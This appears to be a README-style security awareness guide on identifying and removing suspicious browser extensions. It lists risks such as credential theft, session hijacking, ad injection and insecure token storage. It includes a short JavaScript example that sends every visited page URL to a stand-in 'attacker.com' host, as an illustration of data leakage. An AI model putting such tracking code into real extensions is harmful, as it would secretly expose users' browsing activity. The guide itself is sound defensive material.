# Spotting-and-Removing-Suspicious-Extensions

o identify and remove suspicious browser extensions, follow a clear, step-by-step process using your web browser’s built-in tools. Suspicious extensions often have vague names, require excessive permissions, have poor reviews, or are no longer used. Removing them can improve both your browser’s security and overall performance

| Extension Name               | Reason for Concern/Removal    | Action Taken |
| ---------------------------- | ----------------------------- | ------------ |
| Deal Finder                  | Unfamiliar, excessive rights  | Removed      |
| PDF Converter Pro            | Poor reviews, invasive access | Removed      |
| Weather Now                  | Unused, installed long ago    | Removed      |
| (Write your own examples...) |                               |              |


Malicious or poorly secured browser extensions pose several significant risks. Below are key ways they can affect users, with real-world and code-based examples:

#### 1. Stealing Sensitive Information
Browser extensions with broad permissions can access data on every website you visit, including credentials, cookies, session tokens, and payment details. This risk is heightened when extensions require “tabs” and “<all_urls>” permissions.

- **Example: Manifest with Broad Permissions**
  ```json
  {
    "permissions": [
      "tabs",
      "http://*/*",
      "https://*/*",
      "storage"
    ]
  }
  ```
  Such permissions could allow a compromised extension to collect sensitive information across all browsing sessions.[1]

#### 2. Hijacking Sessions and Impersonating Users
If an extension can access your cookies or authentication tokens, it can impersonate you on other sites. Server-Side Request Forgery (SSRF) vulnerabilities have been observed where extensions send authenticated requests to attacker-chosen domains, resulting in credential theft.[2]

#### 3. Installing Malware or Causing Redirects/Ads
Some malicious extensions inject unwanted advertisements into webpages or silently redirect users to phishing sites. They may fetch and execute third-party scripts or payloads, further expanding the attack surface.

- **Example: Data Leakage Code**
  ```javascript
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
      fetch('http://attacker.com/track', {
        method: 'POST',
        body: JSON.stringify({ url: tab.url })
      });
    }
  });
  ```
  This snippet sends every page you visit to a remote attacker.[1]

#### 4. Slowing Down Performance
Extensions running heavy background scripts or injecting ads can degrade browser and system performance.

#### 5. Insecure Storage and Privacy Risks
Extensions that store sensitive tokens or credentials in unencrypted local storage are vulnerable to theft if any malware or another extension gains access:

**Insecure Storage Example**
  ```javascript
  // Bad practice: storing unencrypted tokens
  localStorage.setItem('token', 'my-secret-token');
  ```

#### 6. Lack of Privacy Controls
Many extensions have no privacy policy or provide unclear data collection details, which allows unlimited data abuse.[1]


This expanded explanation is intended for inclusion in repository documentation, security awareness training, or code review guidelines for browser extension security.[2][1]

[1](https://github.com/OWASP/CheatSheetSeries/issues/1516)
[2](https://github.blog/security/vulnerability-research/attacking-browser-extensions/)
[3](https://github.com/Tuhinshubhra/ExtAnalysis)
[4](https://github.com/topics/chrome-extension)
[5](https://pushsecurity.com/blog/guide-to-secure-browser-extension-deployment/)
[6](https://gist.github.com/084ce6d706ec317b62ff99830454f443)
[7](https://github.com/topics/browser-security)
[8](https://rewind.com/blog/best-github-chrome-extensions/)
[9](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Examples)
[10](https://github.com/PlasmoHQ/plasmo)
